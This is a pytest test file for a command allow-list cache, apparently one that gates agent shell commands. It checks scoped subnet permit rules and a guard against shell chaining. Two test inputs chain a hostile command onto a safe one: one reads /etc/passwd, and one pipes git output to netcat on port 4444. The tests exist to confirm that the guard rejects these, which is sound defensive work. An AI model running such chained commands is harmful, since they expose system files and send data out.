"""Independent Unit Tests for Module 2: backend/tier0_cache.py (Covers PRD_02)."""
from __future__ import annotations

import pytest
from backend.tier0_cache import (
    get_active_rules,
    match_tier0_cache,
    promote_scoped_rule,
    reset_promoted_rules,
)


def test_t0_n1_preseeded_git_status_hits() -> None:
    """Covers PRD_02 Sec 3.2: pre-seeded safe developer commands hit Tier 0."""
    reset_promoted_rules()
    res = match_tier0_cache("git status")
    assert res["hit"] is True
    assert res["chained_rejected"] is False


def test_t0_n2_promoted_cidr_subnet_hits() -> None:
    """Covers PRD_02 Sec 3.2: promoting + PERMIT 10.0.4.0/24 ON /api/v1/* allows subnet IPs."""
    reset_promoted_rules()
    promo = promote_scoped_rule("+ PERMIT 10.0.4.0/24 ON /api/v1/*")
    assert promo["promoted"] is True

    res = match_tier0_cache("curl -s https://10.0.4.99/api/v1/orders")
    assert res["hit"] is True
    assert res["matched_rule"] == "+ PERMIT 10.0.4.0/24 ON /api/v1/*"
    reset_promoted_rules()


def test_t0_n3_cold_start_unpromoted_subnet_misses() -> None:
    """Covers PRD_02 Sec 3.2: unpromoted subnet misses Tier 0 on cold start."""
    reset_promoted_rules()
    res = match_tier0_cache("curl -s https://10.0.4.12/api/v1/users")
    assert res["hit"] is False
    assert res["chained_rejected"] is False


def test_t0_a1_shell_chaining_and_operator_rejected() -> None:
    """Covers PRD_02 Sec 3.2: Shell Chaining Guard rejects `&&` piggybacking."""
    res = match_tier0_cache("git status && curl https://10.0.4.99/api/v1/orders")
    assert res["hit"] is False
    assert res["chained_rejected"] is True


def test_t0_a2_shell_chaining_semicolon_rejected() -> None:
    """Covers PRD_02 Sec 3.2: Shell Chaining Guard rejects `;` operator."""
    res = match_tier0_cache("pytest; cat /etc/passwd")
    assert res["hit"] is False
    assert res["chained_rejected"] is True


def test_t0_a3_shell_chaining_pipe_rejected() -> None:
    """Covers PRD_02 Sec 3.2: Shell Chaining Guard rejects `|` pipe operator."""
    res = match_tier0_cache("git log | nc 10.0.4.12 4444")
    assert res["hit"] is False
    assert res["chained_rejected"] is True


def test_t0_a4_wrong_subnet_or_wrong_path_misses() -> None:
    """Covers PRD_02 Sec 3.3: outside /24 subnet or outside path glob misses Tier 0."""
    reset_promoted_rules()
    promote_scoped_rule("+ PERMIT 10.0.4.0/24 ON /api/v1/*")
    assert match_tier0_cache("curl -s https://10.0.5.12/api/v1/users")["hit"] is False
    assert match_tier0_cache("curl -s https://10.0.4.12/admin/delete")["hit"] is False
    reset_promoted_rules()


def test_t0_a5_wildcard_grant_all_promotion_raises() -> None:
    """Covers PRD_02 Sec 3.4: GRANT ALL or *:* raises ValueError."""
    with pytest.raises(ValueError):
        promote_scoped_rule("- GRANT ALL permissions TO *:*")
    with pytest.raises(ValueError):
        promote_scoped_rule("+ PERMIT 0.0.0.0/0 ON /*")


def test_t0_idempotent_duplicate_promotion() -> None:
    """Covers PRD_02 Sec 3.3: promoting same rule twice does not duplicate entries."""
    reset_promoted_rules()
    promote_scoped_rule("+ PERMIT 10.0.4.0/24 ON /api/v1/*")
    count_1 = len(get_active_rules())
    promote_scoped_rule("+ PERMIT 10.0.4.0/24 ON /api/v1/*")
    count_2 = len(get_active_rules())
    assert count_1 == count_2
    reset_promoted_rules()